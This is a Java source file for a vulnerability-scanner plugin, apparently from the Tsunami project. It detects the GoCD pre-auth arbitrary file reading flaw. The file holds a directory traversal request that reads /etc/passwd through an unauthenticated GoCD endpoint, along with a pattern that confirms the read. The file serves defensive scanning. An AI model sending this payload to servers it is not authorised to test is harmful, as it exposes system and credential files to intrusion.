/*
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.gocd;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Pattern;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects the GoCD Pre-Auth Arbitrary File Reading vulnerability.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "GoCDArbitraryFileReadingDetector",
    version = "1.0",
    description = "This detector checks for GoCD Pre-Auth Arbitrary File Reading vulnerability.",
    author = "threedr3am (qiaoer1320@gmail.com)",
    bootstrapModule = GoCDArbitraryFileReadingDetectorBootstrapModule.class
)
public class GoCDArbitraryFileReadingDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String CHECK_VUL_PATH = "go/add-on/business-continuity/api/plugin"
      + "?folderName=&pluginName=../../../../../../../../../../../../../../../../etc/passwd";
  private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("(root:[x*]:0:0:)");

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  GoCDArbitraryFileReadingDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return networkService.getServiceName().isEmpty()
        || NetworkServiceUtils.isWebService(networkService)
        || NetworkServiceUtils.getServiceName(networkService).equals("unknown");
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = buildTargetUrl(networkService);
    try {
      HttpResponse response = httpClient.send(HttpRequest.get(targetUri).withEmptyHeaders().build(),
          networkService);
      if (response.status() == HttpStatus.OK && response.bodyString().isPresent()) {
        String responseBody = response.bodyString().get();
        if (VULNERABILITY_RESPONSE_PATTERN.matcher(responseBody).find()) {
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  private static String buildTargetUrl(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      // Assume the service uses HTTP protocol when the scanner cannot identify the actual service.
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    targetUrlBuilder.append(CHECK_VUL_PATH);
    return targetUrlBuilder.toString();
  }

  public DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("GoCD_ARBITRARY_FILE_READING"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("GoCD Pre-Auth Arbitrary File Reading vulnerability")
                .setDescription(
                    "In GoCD 21.2.0 and earlier, there is an endpoint that can be accessed "
                        + "without authentication. This endpoint has a directory traversal "
                        + "vulnerability, and any user can read any file on the server "
                        + "without authentication, causing information leakage."
                        + "https://www.gocd.org/releases/#21-3-0")
                .setRecommendation("Update 21.3.0 released, or later released.")
        )
        .build();
  }
}
